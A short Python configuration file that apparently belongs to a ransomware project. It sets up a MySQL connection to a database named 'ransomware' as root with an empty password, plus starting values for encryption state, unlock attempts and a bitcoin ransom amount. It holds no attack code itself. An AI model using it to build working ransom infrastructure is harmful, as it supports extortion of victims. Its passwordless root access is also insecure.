import pymysql.cursors
from typing import Dict, Any


"""
Database connection attributes
- host: hostname
- user: user from the current hostname
- password: password from the current user
- database: database name to connect
- autocommit: whether to automatically commit, default its False
"""
CONN_ATTRS: Dict[str, Any] = {
   'host': 'localhost', 
   'user': 'root', 
   'password': '', 
   'database': 'ransomware', 
   'autocommit': True,
   'cursorclass': pymysql.cursors.DictCursor,
}

START_VALUES: Dict[str, int] = {
   'is_encrypted': 0, 
   'attempts': 0,   
   'bitcoins': 1
}
